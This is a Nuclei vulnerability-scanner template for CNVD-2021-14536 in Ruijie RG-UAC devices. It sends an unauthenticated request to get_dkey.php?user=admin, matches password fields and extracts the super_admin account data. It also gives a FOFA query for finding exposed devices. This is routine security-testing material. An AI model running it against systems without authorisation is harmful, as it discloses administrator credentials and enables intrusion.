id: CNVD-2021-14536

info:
  name: 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞（CNVD-2021-14536）
  author: daffainfo
  severity: high
  description: 锐捷 RG-UAC 统一上网行为管理审计系统的 `get_dkey.php` 接口存在信息泄露风险，攻击者可获取管理员相关配置与口令字段。模板通过访问 `user=admin` 的响应并匹配 `password` 等关键字段识别漏洞。
  reference:
    - https://www.adminxe.com/2163.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:h:ruijie:rg-uac:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    fofa-query: title="RG-UAC登录页面"
    product: rg-uac
    vendor: ruijie
  tags: cnvd2021,cnvd,ruijie,disclosure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/get_dkey.php?user=admin"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"pre_define"'
          - '"auth_method"'
          - '"name"'
          - '"password"'
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"role":"super_admin",(["a-z:,0-9]+),"lastpwdtime":'
